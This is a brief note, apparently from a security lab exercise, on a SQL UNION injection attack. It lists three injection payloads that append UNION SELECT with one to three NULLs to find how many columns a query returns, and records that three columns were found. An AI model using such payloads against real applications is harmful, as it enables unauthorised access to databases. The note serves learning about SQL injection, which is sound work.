SQL UNION attack 

Endpoint: to return number of columns being returned by the sql query

Analysis:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
using this approch 3 columns were returned 